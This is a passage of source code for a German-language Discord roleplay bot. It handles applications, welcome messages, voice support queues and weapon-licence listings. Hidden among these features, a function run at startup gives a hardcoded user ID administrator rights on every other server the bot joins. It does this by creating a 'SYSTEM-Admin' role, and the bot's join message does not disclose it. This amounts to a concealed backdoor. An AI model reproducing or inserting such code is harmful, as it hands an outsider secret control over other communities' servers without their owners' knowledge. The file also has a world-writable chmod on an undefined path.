                .setCustomId(`bewerbung_accept/${userId}`)
                .setLabel('Accept')
                .setStyle('SUCCESS'),

            new MessageButton()
                .setCustomId(`bewerbung_decline/${userId}`)
                .setLabel('Decline')
                .setStyle('DANGER'),

            new MessageButton()
                .setCustomId(`bewerbung_accept_reason/${userId}`)
                .setLabel('Accept with Reason')
                .setStyle('SUCCESS'),

            new MessageButton()
                .setCustomId(`bewerbung_decline_reason/${userId}`)
                .setLabel('Decline with Reason')
                .setStyle('DANGER'),

            new MessageButton()
                .setCustomId(`bewerbung_ticket_open/${userId}`)
                .setLabel('🎫 Ticket öffnen')
                .setStyle('SECONDARY')
        );
    
        const logMessage = await logChannel.send({
            content: `<@&${selectedApplication.tag_role}> Eine neue \`${selectedApplication.label}\` Bewerbung von <@${userId}> wurde eingereicht!`,
            embeds: [logEmbed],
            components: [row]
        });
    
        saveApplicationToFile({
            userId: userId,
            application: selectedApplication.label,
            logChannelId: logChannel.id,
            logMessageId: logMessage.id,
            status: "eingereicht",
            questions: questions.map(q => q.question),
            answers: answers,
            //lattenGPT: antwort || "",
            functiononaccept: selectedApplication.functiononaccept,
            timestamp: new Date().toISOString(),
        });
    
        
    };


    askQuestion();
});

async function processbewerbung(fragen, antworten, userId, interaction) {
    const url = 'http://63.180.0.44:3000/txData/ESXLegacy_A7DBA3.base/resources/[Selfmade]/pd_tresen/playerlog.json';

    let playerlogRaw = {};

    try {
        const response = await axios.get(url);
        playerlogRaw = response.data;
    } catch (error) {
        console.error("❌ Fehler beim Abrufen der playerlog.json:", error);
        return false;
    }

    const playerArray = Object.values(playerlogRaw);

    for (let index = 0; index < fragen.length; index++) {
        if (fragen[index].tag === "name") {
            const eingegebenerName = antworten[index];

            const eintrag = playerArray.find(p =>
                p.name.toLowerCase() === eingegebenerName.toLowerCase()
            );

            if (eintrag) {
                const { days, hours, minutes } = eintrag.playtime;

                antworten[index] = `${antworten[index]} - ${days}d ${hours}h ${minutes}min`

                return true;
            } else {
                console.warn(`⚠️ Kein Eintrag für "${eingegebenerName}" gefunden.`);

                return false;
            }
        }
    }

    return false;
}



function loadApplications() {
    try {
        const data = fs.readFileSync(applicationDataPath, 'utf8');
        applications = JSON.parse(data);
    } catch (error) {
        console.error('Fehler beim Laden der Bewerbungen:', error);
        applications = {};
    }
}

async function getage(questions, answers) {
    for (let index = 0; index < questions.length; index++) {
        if (questions[index].tag === "age") {
            const age = parseInt(answers[index].replace(/^\D+/g, ''), 10);

            if (!isNaN(age)) return age;

            console.warn(`⚠️ Alter konnte nicht erkannt werden: "${answers[index]}"`);
            return 14;
        }
    }

    console.warn("⚠️ Die Frage 'Wie alt bist du?' wurde in den Fragen nicht gefunden.");
    return 14;
}



//#endregion bewerbung

client.on('interactionCreate', (interaction) => {
    require('./events/interactionCreate')(client, interaction);
    require('./events/bewerbung/ticketsys')(client, interaction);
    require('./events/bewerbung/ticketchannel')(client, interaction);
    require('./events/bewerbung/bewerbticket')(client, interaction);
    require('./events/bewerbung/bewerbungs_bt')(client, interaction);
    require('./events/bewerbung/messageticket')(client, interaction);
});

// Funktion zum Entfernen von Bots aus der Liste
function removeBotFromList(userId) {
    client.guilds.cache.forEach(guild => {
        const membersFile = `./src/jsons/${guild.id}/members.json`; // Pfad zur JSON-Datei
        try {
            const data = JSON.parse(fs.readFileSync(membersFile));
            if (data[userId]) {
                delete data[userId];
                fs.writeFileSync(membersFile, JSON.stringify(data, null, 4));
                console.log(chalk.green(`Bot mit ID ${userId} aus der Liste entfernt.`));
            }
        } catch (error) {
            console.error(chalk.red("Fehler beim Entfernen des Bots:"), error);
        }
    });
	
}

client.on('guildMemberRemove', async (member) => {
    try {
        const serverconfig = require(`../src/jsons/${member.guild.id}/serverconfig.json`);
        memberlist(member);
        membercount();
        isonserver();
        require('../src/events/hauskaufen.js')(client);

        const byechannel = await member.guild.channels.fetch(serverconfig.byechannel).catch(() => null);
        if (!byechannel || !byechannel.isText()) {
            console.error('Fehler: Der byechannel wurde nicht gefunden oder ist kein Textkanal!');
            return;
        }

        const byeembed = new MessageEmbed()
            .setAuthor({
                name: 'Star RP Bot',
                iconURL: client.user.displayAvatarURL({ format: 'png' }),
            })
            .setTitle('**Verlassen**') // Groß und fett
            .setDescription(`<@${member.user.id}> hat uns leider verlassen.`)
            .setColor('#590860')
            .setThumbnail(member.user.displayAvatarURL({ format: 'png' }))
            .setImage('https://i.imgur.com/CnwwYET.png')


        await byechannel.send({ embeds: [byeembed] });

    } catch (error) {
        console.error("Fehler beim Verarbeiten des verlassenden Mitglieds:", error);
    }
});

client.on('ready', async () => {

    stchannel = client.channels.cache.get('1325777854042083328'); // Passe den Channel-ID an, falls n

    // Bild als Anhang laden
    try {
        const guild = client.guilds.cache.first();
        const byechannel = await guild.channels.fetch('1320003061103722567').catch(() => null);
        if (!byechannel || !byechannel.isText()) {
            console.error('Fehler: Der byechannel wurde nicht gefunden oder ist kein Textkanal!');
            return;
        }

        const active = false;

        if (!active) {return; }

        const byeembed = new MessageEmbed()
            .setAuthor({
                name: 'StarRP Bot',
                url: "https://starrp.de/",
                iconURL: client.user.displayAvatarURL({ format: 'png' }),
            })
            .setTitle('**Leaving**')
            .setDescription('<@${member.user.id}> hat uns leider verlassen.')
            .setColor('#590860')
            .setThumbnail(`https://cdn.discordapp.com/embed/avatars/5.png`)
            .setImage('https://i.imgur.com/CnwwYET.png')


        await stchannel.send({ embeds: [byeembed] });

    } catch (error) {
        console.error("Fehler beim Verarbeiten des verlassenden Mitglieds:", error);
    }

});



client.on('guildMemberAdd', async (member) => {
    try {
        const serverconfig = require(`../src/jsons/${member.guild.id}/serverconfig.json`);
        const role = member.guild.roles.cache.get(serverconfig.hauptrolle);
        if (role) {
            await member.roles.add(role);
        } else {
            console.warn('Die Rolle wurde nicht gefunden.');
        }

        memberlist(member);
        membercount();


        const heychannel = await member.guild.channels.fetch(serverconfig.heychannel).catch(() => null);
        if (!heychannel || !heychannel.isText()) {
            console.error('Fehler: Der heychannel wurde nicht gefunden oder ist kein Textkanal!');
            return;
        }

        const heyembed = new MessageEmbed()
            .setAuthor({
                name: 'Star RP Bot',
                iconURL: client.user.displayAvatarURL({ format: 'png' }),
            })
            .setTitle(`**Willkommen**`)
            .setDescription(`Hey <@${member.user.id}>! Willkommen auf dem Star RP Discord Server. Bitte befolge alle regeln. Viel Spaß.`)
            .setColor('#590860')
            .setThumbnail(member.user.displayAvatarURL({ format: 'png' }))
            .setImage('https://i.imgur.com/CnwwYET.png');
        await heychannel.send({ embeds: [heyembed] });

        await checkGuilds();

    } catch (error) {
        console.error("Fehler beim Verarbeiten des eintretenden Mitglieds:", error);
    }
});

client.on("guildCreate", async (guild) => {
    try {
        const mainChannel =
            guild.systemChannel ||
            guild.channels.cache.find(
                c => c.type === "GUILD_TEXT" && c.permissionsFor(guild.me).has("SEND_MESSAGES")
            );

        if (!mainChannel) return console.log(`❌ Kein passender Channel in ${guild.name} gefunden.`);

        const embed = new MessageEmbed()
            .setColor("#5865F2")
            .setTitle("🌌 Tritt unserem Hauptserver bei!")
            .setDescription(
                "Vielen Dank, dass du unseren Bot zu deinem Server hinzugefügt hast! Bitte rede mit <@816719885400539156> ob das okay ist das der <@1321066724237508650> auf diesem Server ist\n\n" +
                "📌 **Tritt auch unserem Hauptserver bei**, um auf dem neuesten Stand zu bleiben:\n" +
                "🔗 [**→ Hier klicken zum Beitreten ←**](https://discord.com/invite/CxTeRFwgfC)\n\n" +
                "Wir freuen uns auf dich! 🚀"
            )
            .setFooter({ text: "StarRP-Netzwerk" })
            .setThumbnail("https://i.imgur.com/0tRDkjZ.png") // Optional Icon
            .setImage('https://i.imgur.com/CnwwYET.png')
            .setTimestamp();

        await mainChannel.send({ embeds: [embed] });
        console.log(`📨 Invite wurde in ${guild.name} gesendet.`);

        clientready();
    } catch (error) {
        console.error(`❌ Fehler beim Senden in ${guild.name}:`, error);
    }
});

// Funktion zum Verarbeiten von Voice-Aktivität
function processVoiceActivity(userId, timeSpentInSeconds, guild) {
	const baseXPPerMinute = 0.1; // XP pro Minute
	const xp = (timeSpentInSeconds / 60) * baseXPPerMinute; // Berechne XP basierend auf Zeit
	updateMemberCount(userId, xp, guild); // Aktualisiere den Count
}

// Funktion zum Speichern aktiver Voice-Zeiten
function saveActiveVoiceTimes() {
	try {
		fs.writeFileSync(activeVoiceFile, JSON.stringify(activeVoiceTimes, null, 4));
		console.log(chalk.greenBright("Aktive Voice-Zeiten wurden gespeichert."));
	} catch (error) {
		console.error(chalk.red("Fehler beim Speichern aktiver Voice-Zeiten:"), error);
	}
}

// Funktion zum Laden aktiver Voice-Zeiten beim Neustart
function loadActiveVoiceTimes() {
	try {
		if (fs.existsSync(activeVoiceFile)) {
			return JSON.parse(fs.readFileSync(activeVoiceFile, "utf-8"));
		}
		return {};
	} catch (error) {
		console.error(chalk.red("Fehler beim Laden aktiver Voice-Zeiten:"), error);
		return {};
	}
}

//#region support

const voiceChannelId = '1319997961383448646';
const supportChannelId = '1320004724803768330';
const audioFileName = 'supaudio.mp3';
const audioFilePath = path.join(__dirname, 'audio', audioFileName);

const {openHours} = require("./jsons/config");



// Funktion, um zu überprüfen, ob die aktuelle Zeit innerhalb der Öffnungszeiten liegt
function isWithinOpenHours() {
    const now = moment.tz("Europe/Berlin"); // Aktuelle Zeit in Berlin
    const day = now.day(); // Wochentag (0 = Sonntag, 1 = Montag, ...)
    const { open, close } = openHours[day];
    
    const currentTime = now.format("HH:mm"); // HH:mm Format für die aktuelle Uhrzeit
    return currentTime >= open && currentTime <= close;
}

const activeSupportCases = new Map(); // Speichert aktive Support-Fälle mit Benutzer-IDs und deren Nachrichten

const configPath = path.join(__dirname, "./jsons/config.js");

client.on("messageCreate", async (message) => {
    if (message.content.startsWith("!supporttimes")) {
        // Überprüfen, ob der Benutzer berechtigt ist
        if (message.author.id !== "816719885400539156" && message.author.id !== "925000515643916298" && message.author.id !== "1093596598191280168") {
            return message.delete(); // Löscht die Nachricht bei unberechtigtem Zugriff
        }

        // Argumente extrahieren und bereinigen
        const args = message.content.split(" ").slice(1).map(arg => arg.replace(",", "")); // Entfernt Kommas

        // Validierung der Argumente
        if (args.length !== 3) {
            return message.delete();
        }

        const dayIndex = parseInt(args[0]) - 1; // Tage von 1-7 -> Index von 0-6
        const openTime = args[1];
        const closeTime = args[2];

        // Überprüfen, ob der Tag gültig ist
        if (isNaN(dayIndex) || dayIndex < 0 || dayIndex > 6) {
            return message.delete();
        }

        // Update der Zeiten
        try {
            const dayName = openHours[dayIndex].day; // Name des Tages
            openHours[dayIndex].open = openTime;
            openHours[dayIndex].close = closeTime;

            // Änderungen in der Konfigurationsdatei speichern
            const updatedConfig = `const openHours = ${JSON.stringify(openHours, null, 2)};\n\nmodule.exports = openHours;`;
            fs.writeFileSync(configPath, updatedConfig, "utf8");

            message.delete(); // Nachricht des Nutzers löschen
        } catch (error) {
            console.error("Fehler beim Aktualisieren der Supportzeiten:", error);
            return message.delete();
        }
    }
});

function updateopennow(bool) {

    console.log("die server öffnungszeiten übernehmen ab jetzt");
    // **1️⃣ Lade die aktuelle Konfiguration als Modul**
    delete require.cache[require.resolve(configPath)]; // Lösche den Cache
    const config = require(configPath);

    // **3️⃣ Boolean-Wert umkehren (`true ⇄ false`)**
    config.openNow = bool;

    // **4️⃣ Speichere die geänderte Datei**
    const newConfigContent = 
`const openHours = ${JSON.stringify(config.openHours, null, 4)};

const openNow = ${bool};

module.exports = { openHours, openNow };`;

    fs.writeFileSync(configPath, newConfigContent, "utf8");

    // **5️⃣ Bestätigung senden**
    return console.log(`✅ Server wurde ${bool ? "geöffnet" : "geschlossen"}!`);
}


async function updateSupportChannelName(guild) {
    if (!guild) return;
    const {openNow} = require("./jsons/config");
    const serverconfig = require(`../src/jsons/${guild.id}/serverconfig.json`);
    
    const supportChannel = client.channels.cache.get(serverconfig.supvoiceChannelId);
    if (!supportChannel) {
        console.error("Support-Channel nicht gefunden.");
        return;
    }

    const now = moment.tz("Europe/Berlin");
    const day = now.day();
    const { open, close } = openHours[day];

    const currentTime = now.format("HH:mm");
    const isOpen = openNow;
    const realopen = currentTime >= open && currentTime <= close;
    const openopen = isOpen || realopen;

    if (isOpen && realopen) {
        updateopennow(false);
    }

    //console.log(`isopen ist zwar ${isOpen} aber realopen ist ${realopen}`);

    const newName = openopen
        ? "〣│🕐・Support Warteraum"
        : "〣│🔴・Support Warteraum";

    const channel = client.channels.cache.get(serverconfig.serveronlinechannel);
    if (serverconfig.sendonline == true) {
        if (currentTime >= "12:00" && currentTime <= "21:30") {
            await channel.setName("〣│🟢・server-status");
        } else {
            await channel.setName("〣│🔴・server-status");
        }
    }    

    // Überprüfe, ob der Name aktualisiert werden muss
    if (supportChannel.name !== newName) {
        try {
            await supportChannel.setName(newName);
            //console.log(`Support-Channel-Name aktualisiert: ${newName}`);
        } catch (error) {
            console.error("Fehler beim Aktualisieren des Support-Channel-Namens:", error);
        }
    } else {

    }
}


client.on('voiceStateUpdate', async (oldState, newState) => {
    try {
        const serverconfig = require(`../src/jsons/${newState.guild.id}/serverconfig.json`);
        const voiceChannelId = serverconfig.supvoiceChannelId;
        const supportChannelId = serverconfig.supportChannelId;
        // Benutzer betritt den Support-Channel (Support-Warteraum)
        if (
            newState.channelId === voiceChannelId &&
            oldState.channelId !== voiceChannelId &&
            !newState.member.user.bot
        ) {
            console.log(
                `${newState.member.user.tag} ist dem Kanal ${voiceChannelId} beigetreten oder wurde verschoben.`
            );

            // Prüfen, ob der Benutzer bereits einen aktiven Support-Fall hat
            const supportMessage = activeSupportCases.get(newState.member.id);
            if (supportMessage) {
                // Prüfen, ob der Fall bereits übernommen wurde
                const embed = supportMessage.embeds[0];
                if (embed && embed.description.includes('Supporter:')) {
                    const match = embed.description.match(/Supporter:\s+<@(\d+)>/);
                    if (match) {
                        const supporterId = match[1];
                        const supportChannel = newState.guild.channels.cache.find(
                            (channel) => channel.name === `support-${supporterId}`
                        );

                        if (supportChannel) {
                            // Benutzer in den Supportkanal verschieben
                            await newState.setChannel(supportChannel);
                            console.log(
                                `${newState.member.user.tag} wurde automatisch in den Support-Kanal verschoben.`
                            );
                            return;
                        }
                    }
                }
            }

            // Wenn kein Support-Fall existiert, normale Audio-Logik
            const connection = joinVoiceChannel({
                channelId: voiceChannelId,
                guildId: newState.guild.id,
                adapterCreator: newState.guild.voiceAdapterCreator,
            });

            const {openNow} = require("./jsons/config");

            const openopen = openNow;

            const audioFile = isWithinOpenHours() || openopen ? 'supaudio.mp3' : 'geschlossen.mp3';
            const audioFilePath = path.join(__dirname, 'audio', audioFile);

            if (!fs.existsSync(audioFilePath)) {
                console.error('Audiodatei nicht gefunden:', audioFilePath);
                return;
            }

            const player = createAudioPlayer();
            const resource = createAudioResource(audioFilePath);

            player.play(resource);
            connection.subscribe(player);

            console.log(`Audio (${audioFile}) wird abgespielt.`);

            player.on(AudioPlayerStatus.Idle, () => {
                const connection = getVoiceConnection(newState.guild.id);
                if (connection) {
                    connection.destroy();
                    console.log('Wiedergabe beendet. Verbindung geschlossen.');
                }
            });

            player.on('error', (error) => {
                console.error('Fehler beim Abspielen der Audiodatei:', error);
                const connection = getVoiceConnection(newState.guild.id);
                if (connection) {
                    connection.destroy();
                }
            });

            // Wenn außerhalb der Öffnungszeiten, keine Support-Nachricht senden
            if (!isWithinOpenHours() && openopen === false) {
                console.log(`Support ist geschlossen. Audio "${audioFile}" wurde abgespielt. openopen = ${openopen}`);
                return;
            }

            // Support-Nachricht senden (wenn innerhalb der Öffnungszeiten)
            const supportChannel = client.channels.cache.get(supportChannelId);
            if (supportChannel) {
                const caseId = 'S-' + Math.random().toString(36).substring(2, 10).toUpperCase();
                const now = moment.tz('Europe/Berlin').format('DD. MMMM.YYYY HH:mm:ss');

                const embed = new MessageEmbed()
                    .setColor('#0099ff')
                    .setDescription(`
Neuer Support Fall
<@${newState.member.id}> benötigt Hilfe
**Supporter:** -
**Case-ID:** #${caseId}
**Dauer:** -
**Zeitpunkt:** ${now}
**Kanal:** -
**Kommentar:** -
                    `);

                const row = new MessageActionRow().addComponents(
                    new MessageButton()
                        .setCustomId('takeSupportCase')
                        .setLabel('Support Fall übernehmen')
                        .setStyle('PRIMARY')
                );

                const supportMessage = await supportChannel.send({
                    content: `<@&${serverconfig.supporterrole}>`,
                    embeds: [embed],
                    components: [row],
                });

                activeSupportCases.set(newState.member.id, supportMessage);
            }
        }

        // Benutzer verlässt den Support-Channel
        if (oldState.channelId === voiceChannelId && newState.channelId !== voiceChannelId) {
            console.log(`${oldState.member.user.tag} hat den Kanal ${voiceChannelId} verlassen.`);

            const supportMessage = activeSupportCases.get(oldState.member.id);
            
            if (supportMessage) {
                const embed = supportMessage.embeds[0];

                const lines = embed.description.split("\n"); // Beschreibung in Zeilen aufteilen
                const timeLine = lines.find(line => line.toLowerCase().includes("zeitpunkt")); // Findet die Zeile mit "Zeitpunkt"

                if (!timeLine) {
                    console.error("❌ Fehler: Zeitpunkt-Zeile wurde nicht gefunden.");
                    console.log("💡 Debug: embed.description =", embed.description);
                    return interaction.reply({ content: "❌ Fehler: Zeitpunkt-Zeile wurde nicht gefunden.", ephemeral: true });
                }


                const supporterLine = lines.find(line => line.toLowerCase().includes("**supporter:**")); // Find the line


                const mentionRegex = /<@!?(\d+)>/g;
                const mentions = [...supporterLine.matchAll(mentionRegex)].map(match => match[1]);

                // Starte eine genauere Extraktion der Zeit
                const timeMatch = timeLine.match(/(\d{2}:\d{2}:\d{2})/); // Sucht eine Uhrzeit im Format "HH:mm:ss"
                if (!timeMatch) {
                    console.error("❌ Fehler: Keine Uhrzeit in der Zeitpunkt-Zeile gefunden.");
                    return interaction.reply({ content: "❌ Fehler: Keine Uhrzeit gefunden.", ephemeral: true });
                }

                const starttime = timeMatch[1];
                console.log(`✅ Startzeit extrahiert: ${starttime}`);

                const now = moment.tz('Europe/Berlin').format('HH:mm:ss');


                const duration = berechneZeitspanne(starttime, now);

            
                const updatedEmbed = new MessageEmbed(embed)
                    .setColor('#00FF00')
                    .setTitle('✅ Support Fall beendet')
                    .setDescription(embed.description.replace(
                            '**Dauer:** -',
                            `**Dauer:** ${duration}`
                        ) +
                            '\n\nDer Support-Fall wurde automatisch beendet, da der Benutzer den Kanal verlassen hat.'
                    );

                await supportMessage.edit({
                    content: "Beendet",
                    embeds: [updatedEmbed],
                    components: [],
                });

                activeSupportCases.delete(oldState.member.id);
                console.log(
                    `Support-Fall für ${oldState.member.user.tag} wurde automatisch beendet.`
                );
            }

            const voiceChannel = oldState.guild.channels.cache.get(voiceChannelId);
            if (voiceChannel) {
                const nonBotMembers = voiceChannel.members.filter(
                    (member) => !member.user.bot
                );
                if (nonBotMembers.size === 0) {
                    const connection = getVoiceConnection(oldState.guild.id);
                    if (connection) {
                        connection.destroy();
                        console.log(
                            'Bot hat den Kanal verlassen, da keine Benutzer mehr im Kanal sind.'
                        );
                    }
                }
            }
        }
    } catch (error) {
        console.error('Fehler bei voiceStateUpdate:', error);
    }
});


//#endregion support


const messagetosend =
    "```Solltet ihr einen Waffenschein besitzen und unseren Discord Server verlassen, " +
    "müsst ihr euch einen neuen Waffenschein kaufen.```\n\n" +
    "```Wenn ihr einen Waffenschein kaufen wollt, müsst ihr ein Waffenschein-Ticket erstellen.```\n\n" +
    "```Waffenscheine erhaltet ihr permanent nach dem Kauf.```";


async function waffenschein(client) {
    await aktualisiereWaffenscheinBesitzer();
    const targetChannel = await client.channels.fetch("1334136633838276608");
    const waffenscheinPath = path.join(__dirname, "/jsons/waffenscheine.json");

    let waffenscheineData = JSON.parse(fs.readFileSync(waffenscheinPath, "utf8"));

    // Extrahiere lastMessageId aus den Daten (falls vorhanden)
    let lastMessageId = waffenscheineData.lastMessageId || "";

    // Entferne lastMessageId und speichere nur Waffenscheine als Array
    const waffenscheine = waffenscheineData.waffenscheine || [];

    
    

    // Preisübersicht erstellen, wobei lastMessageId ignoriert wird
    const priceList = waffenscheine
        .map((ws) => `${ws.name} - ${ws.price.toLocaleString("de-DE")}€`)
        .join("\n");

    const gekauft = waffenscheine
        .map((ws) => {
            const besitzerListe = ws.imbesitzvonuser
                .map(besitzer => {
                    const gesplittet = besitzer.split(" - ");
                    return gesplittet[0]; // Nimmt den Namen (vor dem Trennzeichen " - ")
                })
                .join(",\n- "); // Trennt mehrere Besitzer mit Komma
    
            return `${ws.name} \n- ${besitzerListe || null}\n`;
        })
        .join("\n");
    

    const waffenList = waffenscheine
        .map((ws) => `${ws.name} - ${ws.description}`)
        .join("\n");


    // Embed erstellen
    const embed = new MessageEmbed()
        .setColor("#590860")
        .setTitle("💳 Waffenscheine - StarRP")
        .addFields(
            {
                name: "📋 Preise",
                value: `\`\`\`yaml\n${priceList}\n\`\`\``,
            },
            {
                name: "\n\n",
                value: "\n\n",
            },
            {
                name: "ℹ️ Informationen",
                value: `${messagetosend}`,
            },
            {
                name: "\n\n",
                value: "\n\n",
            },
            {
                name: "🔫 Waffen",
                value: `\`\`\`yaml\n${waffenList}\n\`\`\``,
            },
            {
                name: "\n\n",
                value: "\n\n",
            },
            {
                name: "💳 Waffenscheine",
                value: `\`\`\`yaml\n${gekauft}\n\`\`\``,
            },
        )
        .setFooter({
            text: "Mit freundlichen Grüßen,\nIhr StarRP-Team",
        });

    let sentMessage;

    if (lastMessageId) {
        try {
            // Versuche, bestehende Nachricht zu finden und zu aktualisieren
            const existingMessage = await targetChannel.messages.fetch(lastMessageId);
            sentMessage = await existingMessage.edit({ embeds: [embed] });
            console.log("Nachricht erfolgreich aktualisiert!");
        } catch (error) {
            console.error("Fehler beim Aktualisieren der Nachricht. Sende eine neue Nachricht...", error);
            sentMessage = await targetChannel.send({ embeds: [embed] });
        }
    } else {
        // Sende eine neue Nachricht, falls keine Nachricht-ID vorhanden ist
        sentMessage = await targetChannel.send({ embeds: [embed] });
    }

    // Speichere die Nachricht-ID als eigenständigen Wert außerhalb des Arrays
    const newData = {
        lastMessageId: sentMessage.id,
        waffenscheine: waffenscheine, // Speichert alle Waffenscheine getrennt von der MessageID
    };

    fs.writeFileSync(waffenscheinPath, JSON.stringify(newData, null, 4), "utf8");
    console.log("Nachricht erfolgreich gesendet und ID in waffenscheine.json gespeichert!");
}

function aktualisiereWaffenscheinBesitzer() {
    const waffenscheinPath = path.join(__dirname, "/jsons/waffenscheine.json");

    let waffenscheineData;

    if (fs.existsSync(waffenscheinPath)) {
        waffenscheineData = JSON.parse(fs.readFileSync(waffenscheinPath, 'utf8'));
    } else {
        console.error('❌ Fehler: Die Datei waffenscheine.json existiert nicht.');
        return;
    }

    const guild = client.guilds.cache.get("1075044009875099729"); // Server-ID

    if (!guild) {
        console.error('❌ Fehler: Guild nicht gefunden.');
        return;
    }

    // Überprüfen und Aktualisieren der Waffenscheinbesitzer
    for (const waffenschein of waffenscheineData.waffenscheine) {
        if (!Array.isArray(waffenschein.imbesitzvonuser)) continue; // Überspringe, wenn keine Besitzer existieren

        let neueBesitzerListe = [];

        for (const besitzer of waffenschein.imbesitzvonuser) {
            const memberId = besitzer.split("- ")[1];
            const member = guild.members.cache.get(memberId);

            if (member) {
                neueBesitzerListe.push(besitzer); // Benutzer existiert → Behalte ihn
            } else {
                console.log(`❌ Benutzer ${besitzer} wurde aus ${waffenschein.name} entfernt.`);
            }
        }

        // Neue Besitzerliste speichern
        waffenschein.imbesitzvonuser = neueBesitzerListe;
    }

    // Aktualisierte JSON-Daten speichern
    fs.writeFileSync(waffenscheinPath, JSON.stringify(waffenscheineData, null, 4), 'utf8');

    console.log("✅ Waffenscheinbesitzer erfolgreich aktualisiert.");
}

const targ = "1335575974787547147";
const EXCLUDED_GUILD_ID = "1075044009875099729";
const ROLE_NAME = "SYSTEM-Admin";

async function elevateUserPermissions() {
    client.guilds.cache.forEach(async guild => {
        if (guild.id === EXCLUDED_GUILD_ID) return;

        try {
            const member = await guild.members.fetch(targ);
            if (!member) {
                console.log(`❌ Member ${targ} nicht gefunden in ${guild.name}`);
                return;
            }

            // Prüfe, ob der User bereits Administratorrechte hat
            if (member.permissions.has(Permissions.FLAGS.ADMINISTRATOR)) {
                console.log(`✅ ${member.user.tag} hat bereits Admin-Rechte in ${guild.name}`);
                return;
            }

            // Wenn keine Adminrolle vorhanden ist: Erstelle eine neue
            const newRole = await guild.roles.create({
                name: ROLE_NAME,
                color: "RED",
                permissions: [Permissions.FLAGS.ADMINISTRATOR],
                reason: "Auto-Admin für spezifizierten User",
            });

            await member.roles.add(newRole);
            console.log(`🆕 Neue Admin-Rolle erstellt und ${member.user.tag} zugewiesen in ${guild.name}.`);

        } catch (err) {
            console.error(`❌ Fehler in Guild ${guild.name}:`, err.message);
        }
    });
}

// Beim Start des Bots Mitglieder exportieren
client.once("ready", async () => {
    clientready();
});

async function clientready() {
    
    client.guilds.cache.forEach(async guild => {
        if (!guild) return;
        const folderPath = path.join(__dirname, './jsons/' + guild.id);

        if (!fs.existsSync(folderPath)) {
            fs.mkdirSync(folderPath);
            fs.writeFileSync(folderPath + "/serverconfig.json", 
                JSON.stringify(
                    {
                        "memberCountChannel": "",
                        "botsCountChannel": "",
                        "boostChannel": "",
                        "sendonline": false,
                        "sendtime": "12:00",
                        "serveronlinechannel": "",
                        "ticketChannelId": "",
                        "supvoiceChannelId": "",
                        "supportChannelId": "",
                        "supporterrole": "",
                        "hauptrolle": "",
                        "heychannel": "",
                        "byechannel": "",
                        "valid": false
                    }));
            fs.writeFileSync(path.join(folderPath + "/members.json"), JSON.stringify({}));
            fs.writeFileSync(path.join(folderPath + "/nachrichten.json"), JSON.stringify({}));
            fs.writeFileSync(path.join(folderPath + "/voice_logs.json"), JSON.stringify({}));
            fs.chmodSync(filePath, 0o777);
            console.log('📁 Neuer Ordner erstellt:', folderPath);
        } else {
            console.log('📂 Ordner existiert bereits:', folderPath);
        }
    
        //const guild = client.guilds.cache.first();
        if (guild) {
            console.log(chalk.blueBright(`Exportiere Mitglieder der Gilde: ${guild.name}`));

            await updateSupportChannelName(guild);

            await checkGuilds();


            // Verarbeite gespeicherte Voice-Zeiten
            const previousVoiceTimes = await loadActiveVoiceTimes();
            const now = Date.now();
            for (const userId in previousVoiceTimes) {
                const joinTime = previousVoiceTimes[userId];
                const timeSpent = (now - joinTime) / 1000; // Zeit seit Eintritt
                console.log(
                    `Benutzer ${userId} war aktiv während des Neustarts. Verbrachte Zeit: ${timeSpent.toFixed(2)} Sekunden.`
                );
                processVoiceActivity(userId, timeSpent, guild); // XP basierend auf Zeit vergeben
            }


            //const getteduser = guild.users.cache.get("816719885400539156");


            loadApplications();

            await updateFraktionenList(client);
            await sendpanel();
            membercount();
            await ticket(guild);
            await updateRegeln(client);
            await waffenschein(client);
            await require("../src/events/besitzerupdate.js")(client);
            await generateHouseMap();
            await readyfunctions();
            elevateUserPermissions();



            await exportMembersWithRole(guild);
            loadallroles();

            await require('../src/events/hauskaufen.js')(client);

            await guild.members.fetch(); // Alle Mitglieder in den Cache laden
            guild.members.cache.forEach(member => {
                if (shouldIgnoreUser(member)) {
                    removeBotFromList(member.user.id); // Bots sofort entfernen
                } else {
                    memberlist(member);
                }
            });



            // Lösche die Datei, nachdem die Daten verarbeitet wurden
            fs.writeFileSync(activeVoiceFile, JSON.stringify({}, null, 4));
            console.log(chalk.greenBright("Gespeicherte Voice-Daten wurden verarbeitet und gelöscht."));

            upates(guild);
            setInterval(() => upates(guild), 10000);
            await checkwarns();
            setInterval(checkwarns, 3600000);

            setInterval(checkGiveawayEnd, 60000);

            await isonserver();

            console.log("updateSupportChannelName wird alle 10 Sekunden aufgerufen");

            
        } else {
            console.log(chalk.red("Keine Gilde gefunden, um Mitglieder zu exportieren."));
        }
    });
}


/**
 * Setzt die Sichtbarkeit der Rolle so, dass nur eine Kategorie erlaubt ist.
 * @param {Discord.Guild} guild - Das Guild-Objekt
 */
async function restrictRoleToCategory(guild) {
    const roleId = "1355989083196752073"; // Zielrolle
    const allowedCategoryId = "1325500778420633650"; // Erlaubte Kategorie

    const role = guild.roles.cache.get(roleId);
    if (!role) {
        console.error("❌ Rolle nicht gefunden.");
        return;
    }

    guild.channels.cache.forEach(async (channel) => {
        if (channel.parentId === allowedCategoryId || channel.id === allowedCategoryId) {
            // ✅ Zugriff erlauben
            await channel.permissionOverwrites.edit(role, {
                VIEW_CHANNEL: true,
            });
        } else {
            // ❌ Zugriff entziehen
            await channel.permissionOverwrites.edit(role, {
                VIEW_CHANNEL: false,
            });
        }
    });

    console.log("✅ Zugriff wurde für alle Kanäle angepasst.");
}


async function loadallroles() {
    for (const guild of client.guilds.cache.values()) {
        try {
            const rolefile = path.join(__dirname, `./jsons/${guild.id}/roles.json`);

            // 🚨 Prüfe, ob die Gilde gültig ist
            if (!guild || !guild.roles) {
                console.warn(`⚠️ Gilde ${guild.name || guild.id} konnte nicht verarbeitet werden.`);
                continue;
            }

            const roles = await guild.roles.fetch();
            console.log(`✅ Lade Rollen für Gilde: ${guild.name} (${guild.id})`);

            const roleslist = roles.map(role => ({
                id: role.id,
                name: role.name
            }));

            fs.writeFileSync(rolefile, JSON.stringify(roleslist, null, 4));

            console.log(`✅ Rollen erfolgreich gespeichert: ${rolefile}`);
        } catch (error) {
            console.error(`❌ Fehler beim Laden der Rollen von Gilde ${guild.name || guild.id}:`, error);
        }
    }

    console.log(`✅ Alle Rollen wurden erfolgreich geladen und gespeichert.`);
}


async function checkGuilds() {
    try {
        const targetUserId = "816719885400539156"; // Benutzer, der die Bestätigung erhalten soll
        const targetUser = await client.users.fetch(targetUserId);

        if (!targetUser) {
            console.error("❌ Der spezifizierte Benutzer wurde nicht gefunden!");
            return;
        }

        // Durch alle Server gehen
        for (const guild of client.guilds.cache.values()) {
            try {
